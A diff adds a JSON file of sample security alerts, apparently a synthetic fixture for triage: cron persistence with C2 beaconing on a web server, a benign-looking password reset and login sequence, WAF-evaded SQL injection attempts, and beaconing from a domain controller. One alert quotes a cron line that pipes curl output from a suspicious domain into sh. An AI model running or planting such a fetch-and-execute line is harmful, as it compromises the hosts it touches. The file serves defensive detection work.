@@ -1,0 +1,15 @@
+[
+  {"timestamp": "2026-10-27T12:58:03Z", "source": "osquery", "type": "new_persistence_cron", "entities": ["web-prod-03"], "details": "New file /etc/cron.d/sync created by ec2-user: '*/5 * * * * curl -s http://update-cdn-sync.xyz/s | sh'"},
+  {"timestamp": "2026-10-27T13:20:00Z", "source": "route53_resolver", "type": "dns_beaconing", "entities": ["web-prod-03", "update-cdn-sync.xyz"], "details": "62 queries for update-cdn-sync.xyz at ~60s intervals over the last hour"},
+  {"timestamp": "2026-10-27T13:22:41Z", "source": "vpc_flow_logs", "type": "outbound_to_c2", "entities": ["web-prod-03", "185.220.101.47"], "details": "TCP 443 outbound, 48 sessions, 2.1 MB sent"},
+
+  {"timestamp": "2026-10-27T14:02:11Z", "source": "servicenow", "type": "helpdesk_password_reset", "entities": ["jdoe"], "details": "Password reset for jdoe completed by helpdesk, ticket INC-88213, identity verified by callback"},
+  {"timestamp": "2026-10-27T14:05:30Z", "source": "azure_ad", "type": "failed_login", "entities": ["jdoe", "10.20.5.14", "LAPTOP-JDOE"], "details": "6 failed sign-ins (bad password) between 14:05 and 14:09 from corporate VPN, usual device"},
+  {"timestamp": "2026-10-27T14:10:02Z", "source": "azure_ad", "type": "successful_login", "entities": ["jdoe", "10.20.5.14", "LAPTOP-JDOE"], "details": "Successful sign-in with MFA (Authenticator push approved) from corporate VPN, usual device"},
+
+  {"timestamp": "2026-10-27T16:44:10Z", "source": "aws_waf", "type": "waf_block", "entities": ["api-gw-01", "203.0.113.77"], "details": "412 requests blocked by SQLi managed rule set in 10 minutes"},
+  {"timestamp": "2026-10-27T16:51:37Z", "source": "api_gateway", "type": "http_500", "entities": ["api-gw-01", "203.0.113.77"], "details": "2 requests to /v2/orders returned HTTP 500 after URL-encoded payloads slipped past the WAF"},
+
+  {"timestamp": "2026-10-27T09:10:00Z", "source": "windows_dns", "type": "dns_beaconing", "entities": ["dc01", "telemetry-ms-update.top"], "details": "Queries every 300s since 2026-10-26 22:00"},
+  {"timestamp": "2026-10-27T09:12:00Z", "source": "crowdstrike", "type": "outbound_to_c2", "entities": ["dc01", "198.51.100.23"], "details": "rundll32.exe making HTTPS connections; parent process unusual for a domain controller"}
+]
